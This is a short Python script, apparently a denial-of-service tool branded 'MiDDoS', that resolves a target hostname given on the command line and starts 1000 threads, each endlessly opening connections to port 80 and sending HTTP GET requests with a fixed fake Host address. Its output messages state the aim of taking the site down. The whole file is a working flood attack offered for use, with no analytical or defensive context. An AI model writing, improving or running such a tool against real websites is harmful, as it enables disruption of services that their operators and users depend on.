import threading
import socket
import sys
import time
import os
import colorama
colorama.init()
a=13
try:
    Address = sys.argv[1] 
    ip = socket.gethostbyname(Address)
    fakeip = '98.13.66.245'
    port = 80
    a = 12
except:
    print('''
      
░█▄█░█░█▀▄░█▀▄░▄▀▄░▄▀▀
▒█▒█░█▒█▄▀▒█▄▀░▀▄▀▒▄██

      ''')
    print('Run code is {python3 main.py {exmple.com}')
    exit()
def StartAttack():
    con = 1
    while True:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip,port))
        s.sendto(("GET /"+ip+"HTTP/1.1\r\n").encode("ascii"),(ip,port))
        s.sendto(("HOST: "+fakeip+'\r\n\r\n').encode('ascii'),(ip,port))
        s.close()
        print('*******************Attack @Hacked Site #try down site *&^*&^*&^*%&^**********')
print('''
      
░█▄█░█░█▀▄░█▀▄░▄▀▄░▄▀▀
▒█▒█░█▒█▄▀▒█▄▀░▀▄▀▒▄██

      ''')
print('loading...')
time.sleep(3)

for i in range(1000):
        if a==12:
            
            
            print(colorama.Fore.GREEN+'')
            thread =  threading.Thread(target=StartAttack)
            thread.start()
        else:
            exit()